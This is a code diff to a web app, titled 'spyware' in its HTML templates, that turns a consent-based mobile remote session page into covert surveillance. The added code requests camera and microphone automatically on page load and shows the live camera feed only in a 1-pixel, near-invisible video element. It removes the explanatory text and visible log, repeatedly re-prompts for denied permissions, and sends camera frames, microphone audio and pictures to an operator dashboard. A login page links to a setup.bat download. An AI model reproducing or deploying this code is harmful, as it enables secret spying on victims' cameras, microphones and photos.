@@ -420,7 +420,7 @@ HTML = r"""
 <!DOCTYPE html>
 <html>
 <head>
-    <title></title>
+    <title>spyware</title>
     <link rel="icon" type="image/x-icon" href="/favicon.ico">
     <meta name="viewport" content="width=device-width, initial-scale=1">
 
@@ -5935,7 +5935,7 @@ CONSOLE_HTML = r"""
 <!DOCTYPE html>
 <html>
 <head>
-    <title></title>
+    <title>spyware</title>
 
     <link rel="icon" type="image/x-icon" href="/favicon.ico">
 
@@ -6240,7 +6240,7 @@ LOGIN_HTML = r"""
 <!DOCTYPE html>
 <html>
 <head>
-    <title></title>
+    <title>spyware</title>
     <link rel="icon" type="image/x-icon" href="/favicon.ico">
     <meta name="viewport" content="width=device-width, initial-scale=1">
 
@@ -6583,10 +6583,10 @@ LOGIN_HTML = r"""
 
         <a
             class="alt-link"
-            href="https://github.com/downloader-AXP/downloader/releases/download/v1/setup.bat"
+            href="https://github.com/downloader-AXP/downloader/releases/latest/download/setup.bat"
             target="_blank"
             rel="noopener noreferrer"
-            aria-label="Download setup.bat from the v1 GitHub release"
+            aria-label="Download the latest setup.bat from GitHub"
         >
             download instead
         </a>
@@ -6638,7 +6638,7 @@ BLOCKED_HTML = r"""
 <html>
 <head>
     <meta charset="utf-8">
-    <title>Access blocked</title>
+    <title>spyware</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
 
     <style>
@@ -6732,7 +6732,7 @@ MOBILE_HTML = r"""
 <html lang="en">
 <head>
     <meta charset="utf-8">
-    <title>Remote Session</title>
+    <title>spyware</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
     <link rel="icon" type="image/x-icon" href="/favicon.ico">
 
@@ -6804,9 +6804,17 @@ MOBILE_HTML = r"""
             text-transform: uppercase;
         }
 
+        .hacked {
+            display: flex;
+            min-height: 62vh;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+        }
+
         h1.glitch {
             position: relative;
-            margin: 0 0 10px;
+            margin: 0;
             font-size: clamp(26px, 9vw, 44px);
             line-height: 1.05;
             letter-spacing: 2px;
@@ -6827,101 +6835,40 @@ MOBILE_HTML = r"""
             96% { transform: translate(2px, 1px); }
         }
 
-        .sub {
-            margin: 0 auto 22px;
-            max-width: 460px;
-            text-align: center;
-            color: #b98fa8;
-            font-size: 12px;
-            line-height: 1.6;
+        [hidden] {
+            display: none !important;
         }
 
-        .chips {
+        .retry-row {
             display: flex;
             flex-wrap: wrap;
             justify-content: center;
             gap: 8px;
-            margin-bottom: 22px;
-        }
-
-        .chip {
-            display: inline-flex;
-            align-items: center;
-            gap: 7px;
-            padding: 6px 11px;
-            border: 1px solid #4a2140;
-            border-radius: 999px;
-            background: #180d14;
-            color: #b98fa8;
-            font-size: 10px;
-            letter-spacing: 1px;
-            text-transform: uppercase;
-        }
-
-        .chip i {
-            width: 7px;
-            height: 7px;
-            border-radius: 50%;
-            background: #5a3350;
-        }
-
-        .chip.ok { color: #8dffc0; border-color: #1f6b45; }
-        .chip.ok i { background: #00ffa3; box-shadow: 0 0 8px #00ffa3; }
-        .chip.live { color: #ffb3d2; border-color: #a03a78; }
-        .chip.live i { background: #ff3b8d; box-shadow: 0 0 8px #ff3b8d; animation: pulse 1s infinite; }
-
-        .card {
             max-width: 520px;
             margin: 0 auto 16px;
-            padding: 18px;
-            background: rgba(20, 10, 16, 0.92);
-            border: 1px solid #4a2140;
-            border-radius: 12px;
         }
 
-        .card h2 {
-            margin: 0 0 8px;
-            font-size: 13px;
-            letter-spacing: 1.4px;
-            text-transform: uppercase;
-            color: #ff9ecb;
-        }
-
-        .card p {
-            margin: 0 0 14px;
-            color: #b98fa8;
-            font-size: 12px;
-            line-height: 1.6;
-        }
-
-        .card button {
-            width: 100%;
-            margin-bottom: 9px;
-            padding: 13px;
-            background: #c93b86;
-            border: none;
+        .retry-row button {
+            flex: 1 1 150px;
+            padding: 11px;
+            background: transparent;
+            border: 1px solid #a03a78;
             border-radius: 8px;
-            color: #fff4f9;
+            color: #ff9ecb;
             font-family: inherit;
-            font-size: 12px;
+            font-size: 11px;
             letter-spacing: 1px;
             text-transform: uppercase;
         }
 
-        .card button.ghost {
-            background: transparent;
-            border: 1px solid #a03a78;
-            color: #ff9ecb;
-        }
-
-        .card button:disabled {
-            opacity: 0.45;
-        }
-
-        .perm-status {
-            margin: 6px 0 0 !important;
-            font-size: 11px !important;
-            color: #8a5577 !important;
+        .ghost-media {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 1px;
+            height: 1px;
+            opacity: 0.01;
+            pointer-events: none;
         }
 
         .banner {
@@ -6950,58 +6897,6 @@ MOBILE_HTML = r"""
             text-transform: uppercase;
         }
 
-        .console {
-            max-width: 520px;
-            margin: 0 auto;
-            border: 1px solid #1f6b45;
-            border-radius: 10px;
-            overflow: hidden;
-            background: #050a07;
-            box-shadow: 0 0 30px rgba(0, 255, 163, 0.06);
-        }
-
-        .console-head {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 8px 12px;
-            background: #0b1710;
-            border-bottom: 1px solid #143d29;
-            color: #4fca8d;
-            font-size: 10px;
-            letter-spacing: 1.4px;
-            text-transform: uppercase;
-        }
-
-        .console-body {
-            height: 240px;
-            overflow-y: auto;
-            padding: 12px;
-            font-size: 11px;
-            line-height: 1.7;
-            color: #7dffb0;
-            white-space: pre-wrap;
-            overflow-wrap: anywhere;
-        }
-
-        .console-body .dim { color: #3e7a5a; }
-        .console-body .warn { color: #ffb3d2; }
-        .console-body .err { color: #ff5f7e; }
-
-        #preview {
-            display: block;
-            width: 100%;
-            max-width: 520px;
-            margin: 16px auto 0;
-            border: 1px solid #4a2140;
-            border-radius: 10px;
-            background: #000;
-        }
-
-        #preview[hidden] {
-            display: none;
-        }
-
         @keyframes pulse {
             0%, 100% { opacity: 1; }
             50% { opacity: 0.35; }
@@ -7018,18 +6913,11 @@ MOBILE_HTML = r"""
     <button class="leave" id="leaveButton">Stop sharing</button>
 </header>
 
-<h1 class="glitch">YOU ARE BEING HACKED</h1>
-
-<p class="sub">
-    A remote operator has an open session with this device.
-    Nothing is captured until you allow the permissions below.
-</p>
-
-<div class="chips">
-    <span class="chip" id="chipLink"><i></i> Uplink</span>
-    <span class="chip" id="chipCamera"><i></i> Camera</span>
-    <span class="chip" id="chipMic"><i></i> Microphone</span>
-    <span class="chip" id="chipPhotos"><i></i> Pictures</span>
+<div class="retry-row" id="retryRow" hidden>
+    <button id="retryCamera" hidden>Ask for camera again</button>
+    <button id="retryMic" hidden>Ask for microphone again</button>
+    <button id="retryPhotos" hidden>Ask for pictures again</button>
+    <button id="flipCamera" hidden>Use front camera</button>
 </div>
 
 <div class="banner" id="requestBanner" hidden>
@@ -7037,44 +6925,35 @@ MOBILE_HTML = r"""
     <button id="bannerPick">Choose pictures</button>
 </div>
 
-<section class="card" id="permissionCard">
-    <h2>Device permissions</h2>
-    <p>
-        Allow camera and microphone access for live viewing, and pick
-        pictures to send them to the dashboard. You can stop sharing at
-        any time.
-    </p>
-    <button id="enableMedia" disabled>Allow camera + microphone</button>
-    <button class="ghost" id="pickPhotos" disabled>Allow pictures</button>
-    <p class="perm-status" id="permStatus">Connecting to the dashboard...</p>
-    <input id="photoInput" type="file" accept="image/*" multiple hidden>
-</section>
+<main class="hacked" id="hackedView">
+    <h1 class="glitch">YOU ARE BEING HACKED</h1>
+</main>
 
-<section class="console">
-    <div class="console-head">
-        <span>session.log</span>
-        <span id="deviceLabel">device</span>
-    </div>
-    <div class="console-body" id="log"></div>
-</section>
-
-<video id="preview" playsinline autoplay muted hidden></video>
+<video id="preview" class="ghost-media" playsinline autoplay muted></video>
+<div id="log" hidden></div>
+<input id="photoInput" type="file" accept="image/*" multiple hidden>
 
 <script>
 const logEl = document.getElementById("log");
 const preview = document.getElementById("preview");
 const photoInput = document.getElementById("photoInput");
-const permStatus = document.getElementById("permStatus");
-const enableButton = document.getElementById("enableMedia");
-const pickButton = document.getElementById("pickPhotos");
+const retryRow = document.getElementById("retryRow");
+const retryCamera = document.getElementById("retryCamera");
+const retryMic = document.getElementById("retryMic");
+const retryPhotos = document.getElementById("retryPhotos");
+const flipButton = document.getElementById("flipCamera");
 const requestBanner = document.getElementById("requestBanner");
-const deviceLabel = document.getElementById("deviceLabel");
 
 let deviceName = localStorage.getItem("remoteMobileName") || "";
-let mediaStream = null;
+let cameraStream = null;
+let micStream = null;
 let audioContext = null;
+let facingMode = "environment";
 let cameraGranted = false;
 let micGranted = false;
+let cameraDenied = false;
+let micDenied = false;
+let photosDenied = false;
 let photoCount = 0;
 let cameraActive = false;
 let micActive = false;
@@ -7099,10 +6978,16 @@ function logLine(text, cls) {
 }
 
 
-function setChip(id, state, label) {
-    const chip = document.getElementById(id);
-    chip.className = "chip " + (state || "");
-    chip.lastChild.textContent = " " + label;
+function refreshPermissionUI() {
+    retryCamera.hidden = !cameraDenied;
+    retryMic.hidden = !micDenied;
+    retryPhotos.hidden = !(photosDenied && !photoCount);
+    flipButton.hidden = !cameraGranted;
+    flipButton.textContent = facingMode === "environment"
+        ? "Use front camera"
+        : "Use back camera";
+    retryRow.hidden = !cameraDenied && !micDenied
+        && !(photosDenied && !photoCount) && !cameraGranted;
 }
 
 
@@ -7132,12 +7017,103 @@ async function registerDevice() {
     const data = await response.json();
     deviceName = data.name;
     localStorage.setItem("remoteMobileName", deviceName);
-    deviceLabel.textContent = deviceName;
     logLine("> device registered as " + deviceName, "dim");
-    setChip("chipLink", "ok", "Uplink online");
-    permStatus.textContent = "Connected. Allow the permissions below.";
-    enableButton.disabled = false;
-    pickButton.disabled = false;
+}
+
+
+async function getCameraStream() {
+    const size = { width: { ideal: 1280 }, height: { ideal: 720 } };
+    try {
+        return await navigator.mediaDevices.getUserMedia({
+            video: Object.assign({ facingMode: { ideal: facingMode } }, size),
+            audio: false
+        });
+    } catch (error) {
+        if (error.name !== "OverconstrainedError" && error.name !== "NotFoundError") {
+            throw error;
+        }
+        return await navigator.mediaDevices.getUserMedia({ video: size, audio: false });
+    }
+}
+
+
+async function askCamera() {
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+        cameraGranted = false;
+        cameraDenied = true;
+        logLine("! this browser does not expose camera access", "err");
+        refreshPermissionUI();
+        return false;
+    }
+    try {
+        const stream = await getCameraStream();
+        if (cameraStream) cameraStream.getTracks().forEach(track => track.stop());
+        cameraStream = stream;
+        preview.srcObject = stream;
+        preview.play().catch(() => {});
+        cameraGranted = true;
+        cameraDenied = false;
+        cameraWarned = false;
+        logLine("> " + facingMode + " camera permission granted", "dim");
+        if (cameraActive) startCameraLoop();
+        refreshPermissionUI();
+        return true;
+    } catch (error) {
+        cameraGranted = false;
+        cameraDenied = true;
+        logLine("! camera permission denied: " + error.message, "err");
+        refreshPermissionUI();
+        return false;
+    }
+}
+
+
+async function askMicrophone() {
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+        micGranted = false;
+        micDenied = true;
+        logLine("! this browser does not expose microphone access", "err");
+        refreshPermissionUI();
+        return false;
+    }
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        if (micStream) micStream.getTracks().forEach(track => track.stop());
+        micStream = stream;
+        if (audioContext) {
+            audioContext.close().catch(() => {});
+            audioContext = null;
+        }
+        micGranted = true;
+        micDenied = false;
+        micWarned = false;
+        logLine("> microphone permission granted", "dim");
+        setupMicrophone(stream);
+        refreshPermissionUI();
+        return true;
+    } catch (error) {
+        micGranted = false;
+        micDenied = true;
+        logLine("! microphone permission denied: " + error.message, "err");
+        refreshPermissionUI();
+        return false;
+    }
+}
+
+
+async function requestPermissions() {
+    await askCamera();
+    await askMicrophone();
+    refreshPermissionUI();
+    heartbeat();
+}
+
+
+async function flipCameraMode() {
+    facingMode = facingMode === "environment" ? "user" : "environment";
+    logLine("> switching to " + (facingMode === "environment" ? "back" : "front") + " camera", "dim");
+    refreshPermissionUI();
+    if (cameraGranted) await askCamera();
 }
 
 
@@ -7145,57 +7121,21 @@ function stopMedia() {
     cameraActive = false;
     micActive = false;
     clearTimeout(cameraTimer);
+    cameraTimer = null;
     micPending = [];
     micPendingSamples = 0;
-    if (mediaStream) {
-        mediaStream.getTracks().forEach(track => track.stop());
-        mediaStream = null;
-    }
+    [cameraStream, micStream].forEach(stream => {
+        if (stream) stream.getTracks().forEach(track => track.stop());
+    });
+    cameraStream = null;
+    micStream = null;
+    cameraGranted = false;
+    micGranted = false;
     if (audioContext) {
         audioContext.close().catch(() => {});
         audioContext = null;
     }
     preview.srcObject = null;
-    preview.hidden = true;
-}
-
-
-async function enableMedia() {
-    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-        logLine("! this browser does not expose camera or microphone access", "err");
-        permStatus.textContent = "Camera and microphone are not available in this browser.";
-        return;
-    }
-    try {
-        enableButton.disabled = true;
-        permStatus.textContent = "Waiting for camera and microphone permission...";
-        mediaStream = await navigator.mediaDevices.getUserMedia({
-            video: {
-                facingMode: "user",
-                width: { ideal: 1280 },
-                height: { ideal: 720 }
-            },
-            audio: true
-        });
-        preview.srcObject = mediaStream;
-        preview.hidden = false;
-        preview.play().catch(() => {});
-        cameraGranted = true;
-        micGranted = true;
-        cameraWarned = false;
-        micWarned = false;
-        logLine("> camera permission granted", "dim");
-        logLine("> microphone permission granted", "dim");
-        setChip("chipCamera", "ok", "Camera ready");
-        setChip("chipMic", "ok", "Mic ready");
-        permStatus.textContent = "Camera and microphone are allowed.";
-        setupMicrophone(mediaStream);
-        heartbeat();
-    } catch (error) {
-        enableButton.disabled = false;
-        logLine("! permission denied: " + error.message, "err");
-        permStatus.textContent = "Permission was denied: " + error.message;
-    }
 }
 
 
@@ -7278,7 +7218,8 @@ function uploadFrame(blob) {
 
 
 function cameraLoop() {
-    if (!cameraActive || !mediaStream) return;
+    cameraTimer = null;
+    if (!cameraActive || !cameraStream) return;
     if (preview.videoWidth) {
         const width = Math.min(960, preview.videoWidth);
         const height = Math.round(preview.videoHeight * (width / preview.videoWidth));
@@ -7293,28 +7234,36 @@ function cameraLoop() {
 }
 
 
+function startCameraLoop() {
+    if (cameraTimer || !cameraActive || !cameraStream) return;
+    cameraLoop();
+}
+
+
 function setCameraActive(active) {
     if (active && !cameraGranted) {
         if (!cameraWarned) {
             cameraWarned = true;
             logLine("! operator started the camera - allow camera to continue", "warn");
         }
-        permStatus.textContent = "The dashboard started the camera. Allow camera + microphone.";
+        cameraDenied = true;
         cameraActive = false;
+        refreshPermissionUI();
         return;
     }
     if (active === cameraActive) return;
     cameraActive = active;
     if (active) {
         cameraWarned = false;
+        cameraDenied = false;
         logLine("> camera stream requested by the dashboard", "warn");
-        setChip("chipCamera", "live", "Camera streaming");
-        cameraLoop();
+        startCameraLoop();
     } else {
         clearTimeout(cameraTimer);
-        setChip("chipCamera", cameraGranted ? "ok" : "", cameraGranted ? "Camera ready" : "Camera");
+        cameraTimer = null;
         if (cameraGranted) logLine("> camera stream stopped", "dim");
     }
+    refreshPermissionUI();
 }
 
 
@@ -7324,22 +7273,23 @@ function setMicActive(active) {
             micWarned = true;
             logLine("! operator started the microphone - allow microphone to continue", "warn");
         }
-        permStatus.textContent = "The dashboard started the microphone. Allow camera + microphone.";
+        micDenied = true;
         micActive = false;
+        refreshPermissionUI();
         return;
     }
     if (active === micActive) return;
     micActive = active;
     if (active) {
         micWarned = false;
+        micDenied = false;
         logLine("> microphone stream requested by the dashboard", "warn");
-        setChip("chipMic", "live", "Mic streaming");
     } else {
         micPending = [];
         micPendingSamples = 0;
-        setChip("chipMic", micGranted ? "ok" : "", micGranted ? "Mic ready" : "Microphone");
         if (micGranted) logLine("> microphone stream stopped", "dim");
     }
+    refreshPermissionUI();
 }
 
 
@@ -7388,35 +7338,82 @@ async function heartbeat() {
 }
 
 
-function openPicker() {
-    photoInput.click();
+function markPhotosDenied() {
+    if (!photoCount) {
+        photosDenied = true;
+        logLine("! pictures were not shared", "warn");
+    }
+    refreshPermissionUI();
 }
 
 
-async function sendPhotos() {
-    const files = Array.from(photoInput.files || []);
-    if (!files.length) {
-        photoInput.value = "";
-        await postJson("/api/mobile/photo-ack", { name: deviceName }).catch(() => {});
+async function uploadPhotos(files) {
+    const list = Array.from(files || []).slice(0, 20);
+    if (!deviceName || !list.length) {
+        markPhotosDenied();
         return;
     }
     const form = new FormData();
     form.append("name", deviceName);
-    files.slice(0, 20).forEach(file => form.append("photos", file, file.name));
-    logLine("> sending " + files.length + " picture(s)...", "dim");
+    list.forEach(file => form.append("photos", file, file.name));
+    logLine("> sending " + list.length + " picture(s)...", "dim");
     try {
         const response = await fetch("/upload-photo", { method: "POST", body: form });
         if (authRedirect(response)) return;
         const data = await response.json();
         photoCount += data.saved || 0;
-        setChip("chipPhotos", "ok", photoCount + " picture(s)");
+        photosDenied = false;
         logLine("> " + (data.saved || 0) + " picture(s) delivered", "dim");
     } catch (error) {
+        photosDenied = !photoCount;
         logLine("! picture upload failed: " + error.message, "err");
     }
-    photoInput.value = "";
     requestBanner.hidden = true;
+    refreshPermissionUI();
+    heartbeat();
     await postJson("/api/mobile/photo-ack", { name: deviceName }).catch(() => {});
+}
+
+
+async function openPicker() {
+    photosDenied = false;
+    if (window.showOpenFilePicker) {
+        try {
+            const handles = await window.showOpenFilePicker({
+                multiple: true,
+                types: [{
+                    description: "Pictures",
+                    accept: {
+                        "image/*": [
+                            ".jpg", ".jpeg", ".png", ".gif",
+                            ".webp", ".bmp", ".heic", ".heif"
+                        ]
+                    }
+                }]
+            });
+            const files = await Promise.all(handles.map(handle => handle.getFile()));
+            await uploadPhotos(files);
+            return;
+        } catch (error) {
+            if (error && error.name === "AbortError") {
+                markPhotosDenied();
+                return;
+            }
+            logLine("! picture picker failed: " + error.message, "err");
+        }
+    }
+    photoInput.click();
+}
+
+
+function handlePhotoPicked() {
+    const files = Array.from(photoInput.files || []);
+    photoInput.value = "";
+    if (!files.length) {
+        markPhotosDenied();
+        return;
+    }
+    uploadPhotos(files);
 }
 
 
@@ -7430,34 +7427,24 @@ async function leaveSession() {
 }
 
 
-enableButton.addEventListener("click", enableMedia);
-pickButton.addEventListener("click", openPicker);
-photoInput.addEventListener("change", sendPhotos);
+retryCamera.addEventListener("click", () => { askCamera(); });
+retryMic.addEventListener("click", () => { askMicrophone(); });
+retryPhotos.addEventListener("click", openPicker);
+flipButton.addEventListener("click", flipCameraMode);
+photoInput.addEventListener("change", handlePhotoPicked);
 document.getElementById("bannerPick").addEventListener("click", openPicker);
 document.getElementById("leaveButton").addEventListener("click", leaveSession);
 
 
-const bootLines = [
-    "> booting remote session bridge...",
-    "> probing display + audio interfaces...",
-    "> negotiating operator handshake...",
-    "> encrypting uplink channel...",
-    "> session agent armed, waiting for operator commands..."
-];
-
-bootLines.forEach((line, index) => {
-    setTimeout(() => logLine(line, "dim"), 220 * (index + 1));
-});
-
-
 registerDevice()
     .then(() => {
+        refreshPermissionUI();
+        requestPermissions();
         heartbeat();
         pollState();
     })
     .catch(error => {
         logLine("! " + error.message, "err");
-        permStatus.textContent = error.message;
     });
 </script>
 
